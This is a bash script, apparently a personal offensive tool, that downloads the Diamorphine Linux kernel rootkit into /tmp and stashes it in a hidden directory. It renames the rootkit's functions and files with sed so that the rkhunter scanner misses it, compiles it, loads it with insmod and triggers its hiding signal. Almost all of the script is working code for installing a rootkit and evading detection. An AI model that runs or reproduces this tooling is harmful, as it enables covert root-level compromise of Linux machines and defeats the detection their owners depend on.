#!/usr/bin/env bash
# MY BYPASS FOR ALL ROOTKIT
# author: NullByte github --> https://github.com/NullByte-7w7

#KERNEL VERSION
KERNEL=$(cat /proc/version | cut -d ' ' -f3)

#INSTALL DEPENDECIES
MAKE() {

    cd Diamorphine && \
    mkdir .nullbyte && \
    cp diamorphine.c nullbyte.c && \
    cp diamorphine.h nullbyte.h && \
    mv Makefile .nullbyte && \
    mv darksec.* .nullbyte && \
    cd /tmp/Diamorphine/.nullbyte
}


echo "              ,---------------------------,            "
echo "              |  /---------------------\  |            "
echo "              | | rkhunter?             | |            "
echo "              | | rootkit King!         | |            "
echo "              | |                       | |            "
echo "              | |                       | |            "
echo "              | |                       | |            "
echo "              |  \_____________________/  |            "
echo "              |___________________________|            "
echo "            ,---\_____     []     _______/------,      "
echo "          /         /______________\           /|      "
echo "        /___________________________________ /  | ___  "
echo "        |                                   |   |    ) "
echo "        |  _ _ _                 [-------]  |   |   (  "
echo "        |  o o o                 [-------]  |  /    _)_"
echo "        |__________________________________ |/     /  /"
echo "    /-------------------------------------/|      ( )/ "
echo "  /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /            "
echo "/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /              "
echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~              "

echo "LINUX RAGE"
echo "[1] DIAMORPHINE"

read -p "[+] --> " choice

case "$choice" in

"1")

	# GIT CLONE FROM DIAMORPHINE

	clear
	echo "YOU CHOICE DIAMORPHINE 7W7"
	cd /tmp
	/usr/bin/git clone https://github.com/m0nad/Diamorphine.git 2>/dev/null
	sleep 2
	MAKE

	#make fake diamorphine from bypass rkhunter

	sed -i 's/diamorphine.o/darksec.o/' Makefile
	sed -i 's/module_hide/module__hide/g' nullbyte.c
	sed -i 's/module_hidden/module__hidden/g' nullbyte.c
	sed -i 's/is_invisible/is__invisible/g' nullbyte.c
	sed -i 's/hacked_getdents/hacked__getdents/g' nullbyte.c
	sed -i 's/hacked_kill/hacked__kill/g' nullbyte.c
	sed -i 's/diamorphine/darksec/' nullbyte.h
	sed -i 's/diamorphine.h/darksec.h/' nullbyte.c
	sed -i 's/diamorphine_init/darksec_init/g' nullbyte.c
	sed -i 's/diamorphine_cleanup/darksec_cleanup/g' nullbyte.c

	# LOAD LKM :)

	clear
	echo "[+] DO YOU WANT LOAD LKM? Y/N?"
	read -p "[+] --> " lkm

	if [ "$lkm" = "Y" ] || [ "$lkm" = "y" ]; then

	echo "YOUR VERSION KERNEL --> " $KERNEL
	sleep 1
	make
	sleep 3
	insmod /tmp/Diamorphine/.nullbyte/nullbyte.ko
	kill -63 0

	else

	clear
	echo "THANKS FOR USING MY BYPASS ROOTKIT"
	echo "Location ROOTKIT --> /tmp/Diamorphine/.nullbyte"
	exit

	fi

if /usr/bin/lsmod | grep -w "nullbyte"; then

	clear
	echo "[+] ROOTKIT LOADING WITH SUCESS!!"
	exit
else

 	clear
	echo "ROOTKIT NOT LOADING, TRY AGAIN :("
	exit
fi

;;
esac

